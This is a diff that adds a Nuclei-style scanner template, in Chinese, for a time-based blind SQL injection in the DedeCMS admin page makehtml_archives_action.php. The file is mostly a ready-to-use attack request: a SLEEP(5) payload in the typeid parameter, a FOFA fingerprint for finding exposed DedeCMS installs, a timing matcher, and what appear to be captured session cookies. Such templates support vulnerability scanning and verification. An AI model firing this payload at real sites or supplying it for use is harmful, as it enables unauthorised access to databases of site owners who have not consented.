@@ -1,0 +1,55 @@
+id: poc-bauyp6re9p73znml
+info:
+  name: DedeCms栏目更新处 sql时间盲注
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bauyp6re9p73znml
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bauyp6re9p73znml
+    fofa: app="dedecms"
+http:
+- raw:
+  - 'GET /dedecms/dede/makehtml_archives_action.php?typeid=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a) HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Connection: close
+
+
+    Cookie: menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; last_vtime=1707197362; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=fc3dc2a4ef75e66d; last_vid=sec%2Csec; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=06a2513292081902; lastCid=17; lastCid1BH21ANI1AGD297L1FF21LN02BGE1DNG=673119b845af569a; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=8b1d56792128e24d; DedeLoginTime=1707274662; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=346b5645435a6323; PHPSESSID=decfeerek8l7sh7860b17m4650; _csrf_name_386c7f53=f67a81cfb4242d5b1d3b3c1f8c2336e5; _csrf_name_386c7f531BH21ANI1AGD297L1FF21LN02BGE1DNG=bbefc5ce8b74e6b5
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
